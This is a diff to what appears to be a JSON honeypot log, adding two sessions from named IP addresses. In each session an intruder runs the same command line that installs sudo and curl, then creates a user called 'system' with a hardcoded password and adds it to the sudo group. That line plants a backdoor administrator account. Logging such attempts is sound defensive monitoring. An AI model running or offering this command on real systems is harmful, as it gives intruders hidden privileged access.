@@ -1505,6 +1505,34 @@
             "session": "f02c950513fd"
         }
     ],
+    "188.166.228.153": [
+        {
+            "timestamp": "2023-11-07T20:16:24.164052Z",
+            "event": "command_input",
+            "input": "apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 7pmb9Zp6) system && sudo usermod -aG sudo system && sudo usermod -aG sudo system",
+            "session": "cb76c37b82db"
+        },
+        {
+            "timestamp": "2023-11-07T20:16:24.164514Z",
+            "event": "command_input",
+            "input": "openssl passwd -1 7pmb9Zp6",
+            "session": "cb76c37b82db"
+        }
+    ],
+    "143.110.190.199": [
+        {
+            "timestamp": "2023-11-07T20:42:38.315556Z",
+            "event": "command_input",
+            "input": "apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 KXWVrz2v) system && sudo usermod -aG sudo system && sudo usermod -aG sudo system",
+            "session": "d9f03ecb0321"
+        },
+        {
+            "timestamp": "2023-11-07T20:42:38.316051Z",
+            "event": "command_input",
+            "input": "openssl passwd -1 KXWVrz2v",
+            "session": "d9f03ecb0321"
+        }
+    ],
     "159.65.146.149": [
         {
             "timestamp": "2023-11-06T00:04:20.154859Z",
